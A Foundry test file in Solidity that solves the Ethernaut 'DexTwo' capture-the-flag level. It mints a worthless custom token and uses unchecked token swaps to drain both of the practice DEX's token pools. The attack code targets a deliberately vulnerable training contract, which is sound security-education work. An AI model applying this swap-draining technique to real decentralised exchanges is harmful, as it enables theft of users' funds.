// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/23-DexTwo/DexTwoFactory.sol";
import "../../../src/core/Ethernaut.sol";
import "../../../src/levels/23-DexTwo/Shitcoin.sol";

contract DexTwoTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testDexTwoHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Shitcoin sc = new Shitcoin("", "");

        address token1 = ethernautDexTwo.token1();
        address token2 = ethernautDexTwo.token2();
        address customToken = address(sc);

        IERC20(token1).approve(address(ethernautDexTwo), type(uint256).max);
        IERC20(token2).approve(address(ethernautDexTwo), type(uint256).max);
        IERC20(customToken).approve(
            address(ethernautDexTwo),
            type(uint256).max
        );
        ethernautDexTwo.add_liquidity(address(customToken), 100);

        ethernautDexTwo.swap(
            token1,
            customToken,
            ethernautDexTwo.balanceOf(token1, address(attacker))
        );
        ethernautDexTwo.swap(
            customToken,
            token1,
            ethernautDexTwo.balanceOf(customToken, address(ethernautDexTwo))
        );

        ethernautDexTwo.swap(
            token2,
            customToken,
            ethernautDexTwo.balanceOf(token2, address(attacker))
        );
        ethernautDexTwo.swap(
            customToken,
            token2,
            ethernautDexTwo.balanceOf(customToken, address(ethernautDexTwo))
        );

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
